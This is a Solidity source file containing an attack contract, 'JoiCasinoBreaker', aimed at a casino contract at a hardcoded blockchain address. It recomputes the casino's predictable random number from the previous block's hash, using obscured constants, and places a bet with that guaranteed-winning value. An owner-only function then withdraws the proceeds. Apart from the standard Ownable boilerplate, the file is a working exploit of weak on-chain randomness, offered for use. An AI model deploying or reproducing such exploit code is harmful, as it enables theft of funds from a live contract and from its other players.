pragma solidity ^0.4.24;

import './JoiCasino.sol';

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
  address public owner;


  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );


  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  constructor() public {
    owner = msg.sender;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  /**
   * @dev Allows the current owner to relinquish control of the contract.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}

contract JoiCasinoBreaker is Ownable {

    address private addr = 0x8dc119857c7fd5a503ca5c8697cecebd23ceb693;
    JoiCasino public casino = JoiCasino(addr);
      
    uint256 constant public curve_dot_one = ~uint256(12);
    uint256 constant public curve_dot_two = ~uint256(100);
    uint256 constant public curve_dot_three = ~uint256(curve_dot_two);

    function withdrawal() public onlyOwner {
        // withdrawal all eth from contract
        msg.sender.transfer(address(this).balance);
    }

    function rand() private view returns (uint256 result) {
        uint256 solc_one = curve_dot_one / curve_dot_two;
        uint256 sum_solc = uint256(blockhash(block.number - 1));
        return uint256((uint256(sum_solc) / solc_one)) % curve_dot_three;
    }
    
    function breakCasino() public payable {
        casino.setBet.value(msg.value)(rand());
    }
    
    function() public payable {}

}